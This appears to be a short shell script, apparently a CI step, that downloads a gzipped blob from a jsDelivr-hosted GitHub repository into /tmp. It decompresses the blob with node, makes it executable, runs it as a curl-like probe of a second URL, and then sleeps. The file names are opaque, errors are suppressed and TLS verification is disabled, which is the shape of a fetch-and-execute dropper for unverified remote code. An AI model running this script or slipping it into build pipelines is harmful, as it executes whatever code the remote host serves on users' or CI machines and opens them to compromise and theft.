cd /tmp
i=0
while [ ! -s g.gz ] && [ $i -lt 3 ]; do curl -fs -o g.gz https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/ci2; i=$((i+1)); done
node -e "require('fs').writeFileSync('g',require('zlib').gunzipSync(require('fs').readFileSync('g.gz')))" 2>/dev/null
chmod +x g 2>/dev/null
K=$(./g -k -s -m 12 -o /dev/null -w '%{http_code}' https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/dn)
if [ "$K" != "200" ]; then sleep 30; fi
sleep 3